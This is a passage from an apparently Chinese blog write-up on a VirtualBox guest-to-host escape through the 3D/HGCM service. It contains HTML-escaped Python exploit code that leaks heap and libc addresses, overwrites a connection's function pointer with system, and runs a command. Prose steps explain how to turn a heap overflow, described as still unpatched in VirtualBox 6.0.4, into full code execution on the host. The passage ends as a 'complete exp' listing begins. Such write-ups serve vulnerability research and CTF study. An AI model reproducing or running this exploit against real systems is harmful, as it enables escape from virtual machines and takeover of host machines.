class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked CRConnection @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_FREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked crVBoxHGCMFree @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+        &lt;span class=&quot;n&quot;&gt;libbase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20650&lt;/span&gt;
+    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libbase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22e3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x122ec0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4f440&lt;/span&gt; 
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked system @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;        hgcm_disconnect(self.client1)&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;        &#39;&#39;&#39;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#if raw_input(&#39;you want RIP control? [y/n] &#39;).startswith(&#39;y&#39;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#    p.rip(0xdeadbeef)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;456&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;456&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;仍然存在的0day&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    Virtualbox官方在2019.1.11修补了两处类似的信息泄露部分，对于堆溢出部分的内容仍然没有修补，导致该漏洞仍然可以被利用。接下来看一下如何只使用堆溢出部分的内容来实现完整逃逸。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;728&quot; data-rawheight=&quot;599&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;728&quot; data-rawheight=&quot;599&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;从一个堆溢出到弹计算器&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    参考之前有leak时的思路，当没有leak时，我们仍然有：&lt;/p&gt;&lt;p&gt;1. 任意地址写&lt;/p&gt;&lt;p&gt;2. 堆越界写&lt;/p&gt;&lt;p&gt;    但是我们没有任何的地址信息，所以接下来的思路就是如何利用一个堆越界写来泄露地址最后达到任意地址读的效果。&lt;/p&gt;&lt;p&gt;    我们可以先参考之前的niklasb任意地址读的实现思路。他是通过读写一个CRConnection结构体的pHostBuffer和cbHostBuffer，以及SHCRGL_GUEST_FN_READ来实现任意地址读。我们使用相同的思路，就需要泄露一个CRConnection结构体的地址。而他之前泄露一个CRConnection结构体的位置是通过crUnpackExtendGetUniformLocation中的堆越界来实现的，而我们想要达到同样的效果可以有一种实现思路：&lt;/p&gt;&lt;p&gt;1. 在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer&lt;/p&gt;&lt;p&gt;2. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分&lt;/p&gt;&lt;p&gt;3. 通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读&lt;/p&gt;&lt;p&gt;    如果在CR_GETUNIFORMLOCATION_EXTEND Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。所以，总体的利用思路如下：&lt;/p&gt;&lt;p&gt;1. 排布内存，使堆空间分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;495&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;813&quot; data-original=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;495&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;813&quot; data-original=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;781&quot; data-rawheight=&quot;222&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;781&quot; data-original=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;781&quot; data-rawheight=&quot;222&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;781&quot; data-original=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;863&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;863&quot; data-original=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;863&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;863&quot; data-original=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2. 通过之前提到的相同操作，通过堆溢出实现任意地址写与越界写&lt;/p&gt;&lt;p&gt;3. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;187&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;187&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;4. 通过crUnpackExtendGetUniformLocation越界读获取CRConnection的地址&lt;/p&gt;&lt;p&gt;5. 通过CRConnection任意地址读获取crVBoxHGCMFree的地址&lt;/p&gt;&lt;p&gt;6. 通过动态库获取libc中system的地址&lt;/p&gt;&lt;p&gt;7. 修改disconnect函数指针为system，修改CRConnection头部为payload8. disconnect弹计算器 &lt;/p&gt;&lt;p&gt;    我在实际实现中多了一个步骤，在泄露完CRConnection地址之后还泄露了一个对应的clientID。（当然这一步也可以省略，在exp中遍历所有的clientID即可）&lt;/p&gt;&lt;p&gt;    完整的exp如下(环境：ubuntu 18.04及其apt安装的Virtualbox 6.0.4)：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_function&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
